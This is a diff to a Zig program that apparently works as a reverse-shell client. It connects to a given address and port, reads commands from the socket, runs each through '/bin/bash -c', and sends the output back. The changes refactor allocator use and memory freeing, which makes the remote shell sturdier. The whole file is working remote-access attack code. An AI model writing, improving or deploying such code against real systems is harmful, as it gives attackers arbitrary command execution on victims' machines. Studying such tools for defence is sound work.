@@ -3,10 +3,7 @@ const std = @import("std");
 const MAX_INPUT_BYTES: usize = 1024;
 const MAX_OUTPUT_BYTES: usize = 2048;
 
-fn readCommand(socket: std.net.Stream) ![][]const u8 {
-    const allocator = std.heap.page_allocator;
-    var cmd = std.ArrayList([]const u8).init(allocator);
-    defer cmd.deinit();
+fn readCommand(allocator: std.mem.Allocator, cmd: *std.ArrayList([]const u8), socket: std.net.Stream) !void {
     try cmd.appendSlice(&[_][]const u8{ "/bin/bash", "-c" });
 
     var buf: [MAX_INPUT_BYTES]u8 = undefined;
@@ -14,8 +11,6 @@ fn readCommand(socket: std.net.Stream) ![][]const u8 {
     if (buf_size == 0) return error.ServerClosed;
 
     try cmd.append(try allocator.dupe(u8, buf[0 .. buf_size - 1])); // Remove last character ('\n') from the buf.
-
-    return cmd.toOwnedSlice();
 }
 
 fn sendResult(allocator: std.mem.Allocator, socket: std.net.Stream, stdout: []const u8, stderr: []const u8) !void {
@@ -42,26 +37,42 @@ pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
     defer socket.close();
     try sendResult(allocator, socket, "", "");
 
-    const page_alloc = std.heap.page_allocator;
-    var output_stdout = std.ArrayList(u8).init(page_alloc);
+    var output_stdout = std.ArrayList(u8).init(allocator);
     defer output_stdout.deinit();
-    var output_stderr = std.ArrayList(u8).init(page_alloc);
+    var output_stderr = std.ArrayList(u8).init(allocator);
     defer output_stderr.deinit();
 
+    var cmd = std.ArrayList([]const u8).init(allocator);
+    defer {
+        for (cmd.items) |c| {
+            allocator.free(c);
+        }
+        cmd.deinit();
+    }
+
     while (true) {
+        // Initialize
+        for (cmd.items) |c| {
+            allocator.free(c);
+        }
+        cmd.clearRetainingCapacity();
         output_stdout.clearRetainingCapacity();
         output_stderr.clearRetainingCapacity();
 
-        const cmd = readCommand(socket) catch |err| {
+        // Read command.
+        readCommand(allocator, &cmd, socket) catch |err| {
             switch (err) {
                 error.ServerClosed => break,
-                else => continue,
+                else => {
+                    std.debug.print("Error: {}\n", .{err});
+                    continue;
+                },
             }
         };
 
         // Execute the command.
         // Source: https://github.com/ziglang/zig/blob/master/lib/std/process/Child.zig#L208
-        var p = std.process.Child.init(cmd, allocator);
+        var p = std.process.Child.init(cmd.items, allocator);
         p.stdout_behavior = .Pipe;
         p.stderr_behavior = .Pipe;
         const fds = try std.posix.pipe2(.{ .CLOEXEC = true });
@@ -72,8 +83,8 @@ pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
         try p.collectOutput(&output_stdout, &output_stderr, MAX_OUTPUT_BYTES);
 
         _ = p.wait() catch |err| {
-            const alloc = std.heap.page_allocator;
-            const error_message = try std.fmt.allocPrint(alloc, "error: {}\n", .{err});
+            const error_message = try std.fmt.allocPrint(allocator, "error: {}\n", .{err});
+            defer allocator.free(error_message);
             _ = try socket.write(error_message);
             continue;
         };
